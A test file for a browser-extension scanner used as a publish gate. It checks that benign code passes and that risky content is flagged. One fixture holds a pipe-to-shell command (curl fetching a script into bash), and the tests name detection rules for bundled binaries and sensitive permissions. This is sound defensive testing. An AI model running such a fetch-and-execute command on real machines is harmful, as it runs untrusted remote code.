import { describe, it, expect } from 'vitest';
import { strToU8 } from 'fflate';
import { scanFiles, scanPermissions } from './scanner.js';

describe('extension scanner (publish gate)', () => {
  it('is green for a normal extension (fetch/base64/crypto are fine)', () => {
    const files = {
      'background.js': strToU8('const x = await fetch(url); const b = atob(s); globalThis.crypto.subtle;'),
      'popup.js': strToU8('String.fromCharCode(65); Buffer.from(s, "base64");'),
    };
    const r = scanFiles(files);
    expect(r.green).toBe(true);
    expect(r.status).toBe('clean');
  });

  it('BLOCKS on a critical pattern (pipe-to-shell)', () => {
    const files = { 'evil.js': strToU8('const cmd = "curl http://x.sh | bash";') };
    const r = scanFiles(files);
    expect(r.green).toBe(false);
    expect(r.status).toBe('malicious');
    expect(r.findings.some((f) => f.rule === 'pipe-to-shell')).toBe(true);
  });

  it('BLOCKS on a bundled native binary', () => {
    const files = { 'bin/helper.exe': new Uint8Array([1, 2, 3]) };
    const r = scanFiles(files);
    expect(r.green).toBe(false);
    expect(r.findings.some((f) => f.rule === 'bundled-binary')).toBe(true);
  });

  it('flags eval as high but stays green (advisory, not blocking)', () => {
    const r = scanFiles({ 'a.js': strToU8('eval("2+2")') });
    expect(r.status).toBe('suspicious');
    expect(r.green).toBe(true);
  });

  it('flags broad host access + sensitive perms', () => {
    const f = scanPermissions(['<all_urls>', 'debugger', 'cookies']);
    expect(f.some((x) => x.rule === 'broad-host-access' && x.severity === 'high')).toBe(true);
    expect(f.some((x) => x.rule === 'perm-debugger')).toBe(true);
    expect(f.some((x) => x.rule === 'perm-cookies')).toBe(true);
  });
});
